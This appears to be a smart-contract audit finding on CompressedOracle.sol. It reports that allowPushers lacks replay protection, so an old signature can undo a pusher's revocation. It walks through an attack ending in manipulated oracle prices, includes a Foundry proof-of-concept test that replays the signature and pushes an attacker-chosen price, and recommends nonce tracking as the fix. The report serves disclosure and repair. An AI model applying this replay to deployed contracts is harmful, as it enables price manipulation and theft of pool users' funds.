### Title
`allowPushers` Signature Replay After `revokePusher` Allows Creator to Re-Delegate a Revoked Pusher Without New Consent — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` has no nonce and no used-signature tracking. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the original EIP-191 signature (same `deadline`, still in the future) to re-write `namespaceRemapping[pusher] = creator`. The pusher's revocation is not final until the deadline expires, violating the stated design invariant.

---

### Finding Description

`allowPushers` verifies a pusher-signed EIP-191 message over `(chainid, address(this), deadline, pusher, creator)` and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is `_ensureDeadline`, which only checks `block.timestamp <= deadline`: [2](#0-1) 

There is no nonce, no per-signature bitmap, and no check that the pusher has previously revoked. `revokePusher()` only zeroes the mapping: [3](#0-2) 

The code comment at lines 186–191 explicitly claims the deadline prevents re-delegation after revocation: [4](#0-3) 

This claim is incorrect. The deadline only prevents use *after* expiry. Within the deadline window, the same signature is unconditionally replayable any number of times.

**Attack sequence:**
1. Pusher signs consent with `deadline = block.timestamp + 1 year`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher's key is compromised; pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator (or attacker who obtained the sig) calls `allowPushers` again with the **identical** `(deadline, pusher, sig)` tuple → `namespaceRemapping[pusher] = creator` is restored.
5. Attacker (holding the compromised pusher key) calls the oracle `fallback` and pushes manipulated slot words into the creator's namespace.
6. Pools consuming the creator's feeds execute swaps at the attacker-controlled price.

---

### Impact Explanation

The `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`: [5](#0-4) 

Once the re-delegation is in place, the compromised pusher key writes arbitrary `(price, spread0, spread1, timestampMs)` tuples into the creator's namespace. Any pool whose `AnchoredPriceProvider` reads those feeds will execute swaps at the attacker-controlled price, causing direct loss of user principal and pool insolvency.

---

### Likelihood Explanation

- Pushers routinely sign long-lived consents (the test suite uses `block.timestamp + 1 days` to `+ 1 year`).
- Key compromise is a realistic operational event; `revokePusher` is the documented mitigation.
- The creator only needs to hold the original calldata (publicly visible on-chain from the first `allowPushers` call) and replay it — no new off-chain coordination required.
- The window is as long as the original deadline, which can be up to years.

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `mapping(bytes32 => bool) usedSignatures` bitmap. Increment or mark the signature hash on first use inside `allowPushers`, and reject any replay. Alternatively, include a per-pusher monotonic nonce in the signed payload so that `revokePusher` can bump the nonce, invalidating all prior signatures.

### Proof of Concept

```solidity
// Foundry unit test (add to CompressedOracle.t.sol)
function testRevokedPusherResumesBySignatureReplay() public {
    uint256 deadline = block.timestamp + 365 days;

    // 1. Pusher signs consent
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);
    address[] memory pushers_ = new address[](1);
    pushers_[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — should revert but does NOT
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);

    // 5. Delegation is restored without new pusher consent
    assertEq(oracle.namespaceRemapping(pusher), creator); // PASSES — revocation bypassed

    // 6. Pusher (attacker) pushes bad price into creator namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(999_999, 2, 2); // attacker-chosen price
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(1, 0, raw, tsMs));
    assertTrue(ok);
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 1, 0)).price,
        U64x32.decode(uint32(raw >> 16))
    ); // attacker price lands in creator namespace
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
